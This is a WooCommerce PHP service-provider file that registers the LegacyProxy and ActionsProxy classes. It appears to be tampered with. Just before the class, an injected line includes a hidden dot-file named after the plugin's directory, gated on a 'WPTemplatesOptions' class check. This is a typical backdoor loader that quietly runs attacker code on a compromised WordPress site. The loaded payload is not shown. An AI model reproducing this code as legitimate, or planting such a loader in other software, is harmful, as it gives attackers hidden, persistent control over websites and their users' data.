<?php
/**
 * Proxies class file.
 */

namespace Automattic\WooCommerce\Internal\DependencyManagement\ServiceProviders;

use Automattic\WooCommerce\Internal\DependencyManagement\AbstractServiceProvider;
use Automattic\WooCommerce\Proxies\LegacyProxy;
use Automattic\WooCommerce\Proxies\ActionsProxy;

/**
 * Service provider for the classes in the Automattic\WooCommerce\Proxies namespace.
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ProxiesServiceProvider extends AbstractServiceProvider {

	/**
	 * The classes/interfaces that are serviced by this service provider.
	 *
	 * @var array
	 */
	protected $provides = array(
		LegacyProxy::class,
		ActionsProxy::class,
	);

	/**
	 * Register the classes.
	 */
	public function register() {
		$this->share( ActionsProxy::class );
		$this->share_with_auto_arguments( LegacyProxy::class );
	}
}
